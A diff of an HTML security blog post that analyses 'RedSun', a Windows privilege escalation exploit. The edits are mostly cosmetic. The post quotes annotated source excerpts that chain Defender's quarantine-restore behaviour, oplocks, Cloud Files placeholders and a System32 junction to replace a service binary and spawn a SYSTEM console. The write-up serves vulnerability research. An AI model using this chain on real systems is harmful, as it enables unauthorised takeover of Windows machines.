 HRESULT hs = <span class="hl-fn">CfRegisterSyncRoot</span>(syncroot, &amp;cfreg, &amp;syncpolicy,
                                    CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
 
-<span class="hl-cm">// No callbacks — we are not a real cloud provider</span>
+<span class="hl-cm">// No callbacks - we are not a real cloud provider</span>
 CF_CALLBACK_REGISTRATION callbackreg[<span class="hl-num">1</span>];
 callbackreg[<span class="hl-num">0</span>] = { CF_CALLBACK_TYPE_NONE, <span class="hl-kw">NULL</span> };
 <span class="hl-fn">CfConnectSyncRoot</span>(syncroot, callbackreg, callbackctx, ...);
 
-<span class="hl-cm">// Create the placeholder with MARK_IN_SYNC — tells the system the file is</span>
+<span class="hl-cm">// Create the placeholder with MARK_IN_SYNC - tells the system the file is</span>
 <span class="hl-cm">// "up to date with the cloud", affecting how Defender treats it</span>
 placeholder[<span class="hl-num">0</span>].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE
                       | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
 <span class="hl-fn">CfCreatePlaceholders</span>(syncroot, placeholder, <span class="hl-num">1</span>, CF_CREATE_FLAG_STOP_ON_ERROR, &amp;processedentries);</code></pre>
         </div>
 
-        <p>The <span class="ic">CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE</span> flag replaces whatever is at the path (in this case, nothing — the file was just POSIX-deleted) with a new placeholder. The <span class="ic">CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC</span> flag marks the placeholder as synchronized, which is the key to triggering Defender's write-back behavior.</p>
+        <p>The <span class="ic">CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE</span> flag replaces whatever is at the path (in this case, nothing - the file was just POSIX-deleted) with a new placeholder. The <span class="ic">CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC</span> flag marks the placeholder as synchronized, which is the key to triggering Defender's write-back behavior.</p>
 
         <p>After <span class="ic">DoCloudStuff</span> returns, the main thread signals the VSS watcher thread to release the oplock, letting Defender proceed:</p>
 
         <div class="code-block">
-          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — main()</span></div>
+          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - main()</span></div>
           <pre><code><span class="hl-fn">SetEvent</span>(gevent);           <span class="hl-cm">// tell VSS thread: placeholder is ready, release the oplock</span>
 <span class="hl-fn">WaitOnAddress</span>(&amp;gevent, &amp;gevent, <span class="hl-kw">sizeof</span>(HANDLE), INFINITE);
 <span class="hl-cm">// blocks until the VSS thread closes gevent (sets it NULL after releasing oplock)</span></code></pre>
@@ -651,21 +649,21 @@ placeholder[<span class="hl-num">0</span>].Flags = CF_PLACEHOLDER_CREATE_FLAG_SU
 
       <!-- 4.5 Junction Swap -->
       <div class="subsection" id="code-junction">
-        <h3 class="subsection-heading">4.5 — The Second Oplock &amp; Junction Swap</h3>
+        <h3 class="subsection-heading">4.5 - The Second Oplock &amp; Junction Swap</h3>
         <p>The main thread now sets up the second timing gate: a new file at the same path, with a batch oplock and a memory-mapped section to keep it pinned.</p>
 
         <div class="code-block">
-          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — main()</span></div>
+          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - main()</span></div>
           <pre><code><span class="hl-cm">// Recreate the directory (moved the cloud-sync-root directory aside first)</span>
 <span class="hl-fn">MoveFileEx</span>(workdir, workdir_tmp, MOVEFILE_REPLACE_EXISTING);
 <span class="hl-fn">CreateDirectory</span>(workdir, <span class="hl-kw">NULL</span>);
 
-<span class="hl-cm">// Create a new file at the same path — Defender's restore write will target this</span>
+<span class="hl-cm">// Create a new file at the same path - Defender's restore write will target this</span>
 stat = <span class="hl-fn">NtCreateFile</span>(&amp;hfile, FILE_READ_DATA | DELETE | SYNCHRONIZE, &amp;_objattr, &amp;iostat,
                     &amp;fsz, FILE_ATTRIBUTE_READONLY, FILE_SHARE_READ,
                     FILE_SUPERSEDE, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>);
 
-<span class="hl-cm">// Place second batch oplock — breaks when Defender opens this file for the restore write</span>
+<span class="hl-cm">// Place second batch oplock - breaks when Defender opens this file for the restore write</span>
 <span class="hl-fn">DeviceIoControl</span>(hfile, FSCTL_REQUEST_BATCH_OPLOCK, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, &amp;ovd);
 
 <span class="hl-cm">// Memory-map the file to prevent it from being deleted or superseded prematurely</span>
@@ -676,10 +674,10 @@ HANDLE hmap = <span class="hl-fn">CreateFileMapping</span>(hfile, <span class="h
 <span class="hl-fn">GetOverlappedResult</span>(hfile, &amp;ovd, &amp;nbytes, <span class="hl-kw">TRUE</span>);</code></pre>
         </div>
 
-        <p>When <span class="ic">GetOverlappedResult</span> returns, Defender is frozen — it tried to open the file and the batch oplock blocked it. The exploit now has a kernel-guaranteed window to make changes. It uses this window to do three things:</p>
+        <p>When <span class="ic">GetOverlappedResult</span> returns, Defender is frozen - it tried to open the file and the batch oplock blocked it. The exploit now has a kernel-guaranteed window to make changes. It uses this window to do three things:</p>
 
         <div class="code-block">
-          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — inside the oplock break window</span></div>
+          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - inside the oplock break window</span></div>
           <pre><code><span class="hl-fn">UnmapViewOfFile</span>(mappingaddr);
 <span class="hl-fn">CloseHandle</span>(hmap);
 
@@ -695,7 +693,7 @@ stat = <span class="hl-fn">NtCreateFile</span>(&amp;hrp, FILE_WRITE_DATA | DELET
                     <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                     FILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>);
 
-<span class="hl-cm">// 4. SET THE JUNCTION — workdir now redirects to C:\Windows\System32</span>
+<span class="hl-cm">// 4. SET THE JUNCTION - workdir now redirects to C:\Windows\System32</span>
 wchar_t rptarget[] = { <span class="hl-str">L"\\??\\C:\\Windows\\System32"</span> };
 <span class="hl-cm">// ... build REPARSE_DATA_BUFFER ...</span>
 rdb-&gt;ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
@@ -704,14 +702,14 @@ rdb-&gt;ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
 
         <div class="callout callout-tip">
           <strong>What the rename does</strong>
-          Renaming <span class="ic">hfile</span> to <span class="ic">workdir.TEMP2</span> moves the file handle to a new path without closing it. The path <span class="ic">workdir\TieringEngineService.exe</span> is now empty. When Defender's open request is released, the operating system resolves the path fresh — and this time, <span class="ic">workdir</span> is a junction to System32.
+          Renaming <span class="ic">hfile</span> to <span class="ic">workdir.TEMP2</span> moves the file handle to a new path without closing it. The path <span class="ic">workdir\TieringEngineService.exe</span> is now empty. When Defender's open request is released, the operating system resolves the path fresh - and this time, <span class="ic">workdir</span> is a junction to System32.
         </div>
 
-        <p>The exploit then releases the oplock by closing <span class="ic">hfile</span>. This is the critical moment — it happens on line 739 of the source, <em>before</em> the write loop:</p>
+        <p>The exploit then releases the oplock by closing <span class="ic">hfile</span>. This is the critical moment - it happens on line 739 of the source, <em>before</em> the write loop:</p>
 
         <div class="code-block">
-          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — line 739 (before the loop at line 740)</span></div>
-          <pre><code><span class="hl-fn">CloseHandle</span>(hfile);   <span class="hl-cm">// oplock acknowledged — Defender's open proceeds</span>
+          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - line 739 (before the loop at line 740)</span></div>
+          <pre><code><span class="hl-fn">CloseHandle</span>(hfile);   <span class="hl-cm">// oplock acknowledged - Defender's open proceeds</span>
                        <span class="hl-cm">// workdir is now a junction → System32</span>
                        <span class="hl-cm">// Defender opens System32\TieringEngineService.exe as SYSTEM</span>
                        <span class="hl-cm">// Defender writes the file's content there</span>
@@ -728,16 +726,16 @@ rdb-&gt;ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
 }</code></pre>
         </div>
 
-        <p>Defender's write through the junction lands in System32. Once Defender releases its handle, the loop obtains a write handle — using <span class="ic">FILE_SUPERSEDE</span> and <span class="ic">FILE_SHARE_WRITE</span> to coexist with or supersede Defender's open — and the exploit proceeds to overwrite the binary.</p>
+        <p>Defender's write through the junction lands in System32. Once Defender releases its handle, the loop obtains a write handle - using <span class="ic">FILE_SUPERSEDE</span> and <span class="ic">FILE_SHARE_WRITE</span> to coexist with or supersede Defender's open - and the exploit proceeds to overwrite the binary.</p>
       </div>
 
       <!-- 4.6 SYSTEM Shell Delivery -->
       <div class="subsection" id="code-system">
-        <h3 class="subsection-heading">4.6 — Binary Replacement &amp; SYSTEM Shell Delivery</h3>
+        <h3 class="subsection-heading">4.6 - Binary Replacement &amp; SYSTEM Shell Delivery</h3>
         <p>With a write handle to <span class="ic">System32\TieringEngineService.exe</span> obtained, the exploit replaces the file with itself:</p>
 
         <div class="code-block">
-          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — main()</span></div>
+          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - main()</span></div>
           <pre><code><span class="hl-fn">CloseHandle</span>(hlk);   <span class="hl-cm">// release write handle</span>
 
 <span class="hl-cm">// mx = full path to the running RedSun.exe binary</span>
@@ -748,13 +746,13 @@ wchar_t mx[MAX_PATH] = { <span class="hl-num">0</span> };
 wchar_t mx2[MAX_PATH] = { <span class="hl-num">0</span> };
 <span class="hl-fn">ExpandEnvironmentStrings</span>(<span class="hl-str">L"%WINDIR%\\System32\\TieringEngineService.exe"</span>, mx2, MAX_PATH);
 
-<span class="hl-fn">CopyFile</span>(mx, mx2, <span class="hl-kw">FALSE</span>);  <span class="hl-cm">// overwrite with ourselves — FALSE = overwrite if exists</span>
+<span class="hl-fn">CopyFile</span>(mx, mx2, <span class="hl-kw">FALSE</span>);  <span class="hl-cm">// overwrite with ourselves - FALSE = overwrite if exists</span>
 
 <span class="hl-fn">LaunchTierManagementEng</span>();   <span class="hl-cm">// trigger COM activation of the service</span></code></pre>
         </div>
 
         <div class="code-block">
-          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — LaunchTierManagementEng()</span></div>
+          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - LaunchTierManagementEng()</span></div>
           <pre><code><span class="hl-fn">CoInitialize</span>(<span class="hl-kw">NULL</span>);
 
 <span class="hl-cm">// CLSID for the Storage Tiers Management COM server</span>
@@ -769,10 +767,10 @@ GUID guidObject = { <span class="hl-num">0x50d185b9</span>, <span class="hl-num"
 <span class="hl-fn">CoUninitialize</span>();</code></pre>
         </div>
 
-        <p>COM activation causes Windows to start <span class="ic">TieringEngineService.exe</span> as SYSTEM — but that binary is now a copy of RedSun.exe. The moment it starts, the global initializer fires:</p>
+        <p>COM activation causes Windows to start <span class="ic">TieringEngineService.exe</span> as SYSTEM - but that binary is now a copy of RedSun.exe. The moment it starts, the global initializer fires:</p>
 
         <div class="code-block">
-          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — LaunchConsoleInSessionId()</span></div>
+          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - LaunchConsoleInSessionId()</span></div>
           <pre><code><span class="hl-cm">// Open the named pipe created by the first stage to get the user's session ID</span>
 HANDLE hpipe = <span class="hl-fn">CreateFile</span>(<span class="hl-str">L"\\??\\pipe\\REDSUN"</span>, GENERIC_READ, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="hl-kw">NULL</span>);
@@ -795,7 +793,7 @@ HANDLE hnewtoken = <span class="hl-kw">NULL</span>;
                     <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, <span class="hl-kw">FALSE</span>, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, &amp;si, &amp;pi);</code></pre>
         </div>
 
-        <p>The named pipe <span class="ic">\\.\pipe\REDSUN</span> was created by the first-stage <span class="ic">main()</span> process. <span class="ic">GetNamedPipeServerSessionId</span> returns the interactive session ID of whoever created the pipe — the original user's desktop. The SYSTEM process then sets its duplicated token's session to match, and launches <span class="ic">conhost.exe</span> (the Windows console host) into that session. The result: a console window appears on the user's desktop running as NT AUTHORITY\SYSTEM.</p>
+        <p>The named pipe <span class="ic">\\.\pipe\REDSUN</span> was created by the first-stage <span class="ic">main()</span> process. <span class="ic">GetNamedPipeServerSessionId</span> returns the interactive session ID of whoever created the pipe - the original user's desktop. The SYSTEM process then sets its duplicated token's session to match, and launches <span class="ic">conhost.exe</span> (the Windows console host) into that session. The result: a console window appears on the user's desktop running as NT AUTHORITY\SYSTEM.</p>
       </div>
     </section>
 
@@ -803,33 +801,33 @@ HANDLE hnewtoken = <span class="hl-kw">NULL</span>;
 
     <!-- ── SECTION 5: IMPACT ── -->
     <section class="article-section" id="impact">
-      <h2 class="section-heading"><span class="sh-num">05</span> Impact &amp; Takeaway</h2>
+      <h2 class="section-heading"><i class="sh-icon fa-solid fa-flag"></i> Impact &amp; Takeaway</h2>
 
-      <p>RedSun achieves local privilege escalation to SYSTEM without any kernel exploit, memory corruption, or driver vulnerability. The entire attack operates entirely in usermode, using documented and semi-documented APIs. The root cause is a TOCTOU (time-of-check, time-of-use) flaw in Windows Defender's remediation pipeline — the path it resolves at detection time is not the same path it writes to at restore time, and the window between the two is large enough to be reliably exploited.</p>
+      <p>RedSun achieves local privilege escalation to SYSTEM without any kernel exploit, memory corruption, or driver vulnerability. The entire attack operates entirely in usermode, using documented and semi-documented APIs. The root cause is a TOCTOU (time-of-check, time-of-use) flaw in Windows Defender's remediation pipeline - the path it resolves at detection time is not the same path it writes to at restore time, and the window between the two is large enough to be reliably exploited.</p>
 
       <div class="callout callout-danger">
         <strong>The Core Irony</strong>
         The entity performing the privileged write into System32 is Windows Defender itself. The exploit never directly touches System32 until after the write path has been redirected. The antivirus, by trying to restore a file it just quarantined, becomes the tool of its own defeat.
       </div>
 
-      <p>Five primitives — oplocks, VSS, Cloud Files, POSIX delete, and directory junctions — each individually legitimate and documented, combine into an arbitrary SYSTEM-write chain when strung together in the right order. This is characteristic of a class of Windows privilege escalation vulnerabilities sometimes called <em>logic bugs</em>: no memory is corrupted, no shellcode is executed, and no kernel structures are touched. The attacker is simply asking the operating system to do what it was designed to do, in an order it wasn't designed to handle safely.</p>
+      <p>Five primitives - oplocks, VSS, Cloud Files, POSIX delete, and directory junctions - each individually legitimate and documented, combine into an arbitrary SYSTEM-write chain when strung together in the right order. This is characteristic of a class of Windows privilege escalation vulnerabilities sometimes called <em>logic bugs</em>: no memory is corrupted, no shellcode is executed, and no kernel structures are touched. The attacker is simply asking the operating system to do what it was designed to do, in an order it wasn't designed to handle safely.</p>
 
       <p>The comment left in the source code says it all:</p>
 
       <div class="code-block">
-        <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — line 3</span></div>
+        <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - line 3</span></div>
         <pre><code><span class="hl-cm">// It gets funnier as time passes...</span></code></pre>
       </div>
 
       <p>And the sync root provider name registered with the Cloud Files API:</p>
 
       <div class="code-block">
-        <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — DoCloudStuff()</span></div>
+        <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - DoCloudStuff()</span></div>
         <pre><code>cfreg.ProviderName = <span class="hl-str">L"SERIOUSLYMSFT"</span>;
 <span class="hl-cm">// "let's see how long you can play this game, I'm willing to go as far as you want."</span></code></pre>
       </div>
 
-      <p>RedSun is a reminder that privilege escalation research often isn't about finding crashes or memory bugs — it's about understanding system design deeply enough to ask: <em>what happens when these two features talk to each other in a way their designers never considered?</em></p>
+      <p>RedSun is a reminder that privilege escalation research often isn't about finding crashes or memory bugs - it's about understanding system design deeply enough to ask: <em>what happens when these two features talk to each other in a way their designers never considered?</em></p>
     </section>
 
   </div>
@@ -838,7 +836,7 @@ HANDLE hnewtoken = <span class="hl-kw">NULL</span>;
 <footer>
   <div class="footer-inner">
     <span class="footer-logo">cyb3r-w0lf</span>
-    <p>Copyright &copy; 2026 Akileshkumar — All Rights Reserved.</p>
+    <p>Copyright &copy; 2026 Akileshkumar - All Rights Reserved.</p>
     <div class="footer-links">
       <a href="./index.html">All Posts</a>
       <a href="../index.html">Portfolio</a>
@@ -847,5 +845,26 @@ HANDLE hnewtoken = <span class="hl-kw">NULL</span>;
   </div>
 </footer>
 
+<script>
+document.querySelectorAll('.code-block').forEach(function(block){
+  var header=block.querySelector('.cb-header');
+  var code=block.querySelector('pre code');
+  if(!header||!code)return;
+  var btn=document.createElement('button');
+  btn.className='copy-btn';
+  btn.innerHTML='<i class="fa-regular fa-copy"></i> Copy';
+  btn.addEventListener('click',function(){
+    navigator.clipboard.writeText(code.innerText).then(function(){
+      btn.innerHTML='<i class="fa-solid fa-check"></i> Copied';
+      btn.classList.add('copied');
+      setTimeout(function(){
+        btn.innerHTML='<i class="fa-regular fa-copy"></i> Copy';
+        btn.classList.remove('copied');
+      },2000);
+    });
+  });
+  header.appendChild(btn);
+});
+</script>
 </body>
 </html>
